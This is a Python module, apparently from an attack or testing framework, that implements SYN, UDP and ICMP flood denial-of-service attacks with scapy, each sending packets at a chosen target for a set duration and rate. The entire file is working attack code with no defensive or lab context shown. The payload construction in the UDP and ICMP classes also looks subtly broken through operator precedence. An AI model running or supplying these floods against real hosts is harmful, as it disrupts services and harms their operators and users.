from scapy.all import IP, TCP, send, RandShort
import time
from .attack_base import AttackBase
from ..utils.logger import setup_logger

logger = setup_logger('dos_attack')

class DoSAttack(AttackBase):
    """SYN Flood DoS Attack"""
    
    def __init__(self):
        super().__init__(
            name="SYN Flood DoS",
            description="TCP SYN flood denial of service attack"
        )
    
    def execute(self, target, duration=30, packet_rate=100, target_port=80):
        """Execute SYN flood attack"""
        logger.info(f"Starting SYN flood: {target}:{target_port} for {duration}s")
        
        start_time = time.time()
        packets_sent = 0
        
        try:
            while time.time() - start_time < duration:
                # Create SYN packet
                ip = IP(dst=target)
                tcp = TCP(sport=RandShort(), dport=target_port, flags='S')
                packet = ip/tcp
                
                # Send packet
                send(packet, verbose=0)
                packets_sent += 1
                
                # Rate limiting
                if packet_rate > 0:
                    time.sleep(1.0 / packet_rate)
        
        except KeyboardInterrupt:
            logger.info("Attack interrupted by user")
        except Exception as e:
            logger.error(f"Attack error: {e}")
        
        logger.info(f"SYN flood completed: {packets_sent} packets sent")
        return {'packets_sent': packets_sent}

class UDPFloodAttack(AttackBase):
    """UDP Flood Attack"""
    
    def __init__(self):
        super().__init__(
            name="UDP Flood",
            description="UDP flood denial of service attack"
        )
    
    def execute(self, target, duration=30, packet_rate=100, target_port=53):
        """Execute UDP flood attack"""
        from scapy.all import UDP
        
        logger.info(f"Starting UDP flood: {target}:{target_port}")
        
        start_time = time.time()
        packets_sent = 0
        
        try:
            while time.time() - start_time < duration:
                ip = IP(dst=target)
                udp = UDP(sport=RandShort(), dport=target_port)
                packet = ip/udp/"X"*1024  # 1KB payload
                
                send(packet, verbose=0)
                packets_sent += 1
                
                if packet_rate > 0:
                    time.sleep(1.0 / packet_rate)
        
        except Exception as e:
            logger.error(f"UDP flood error: {e}")
        
        logger.info(f"UDP flood completed: {packets_sent} packets sent")
        return {'packets_sent': packets_sent}

class ICMPFloodAttack(AttackBase):
    """ICMP Flood Attack"""
    
    def __init__(self):
        super().__init__(
            name="ICMP Flood",
            description="ICMP echo request flood attack"
        )
    
    def execute(self, target, duration=30, packet_rate=100):
        """Execute ICMP flood attack"""
        from scapy.all import ICMP
        
        logger.info(f"Starting ICMP flood: {target}")
        
        start_time = time.time()
        packets_sent = 0
        
        try:
            while time.time() - start_time < duration:
                ip = IP(dst=target)
                icmp = ICMP()
                packet = ip/icmp/"X"*56
                
                send(packet, verbose=0)
                packets_sent += 1
                
                if packet_rate > 0:
                    time.sleep(1.0 / packet_rate)
        
        except Exception as e:
            logger.error(f"ICMP flood error: {e}")
        
        logger.info(f"ICMP flood completed: {packets_sent} packets sent")
        return {'packets_sent': packets_sent}
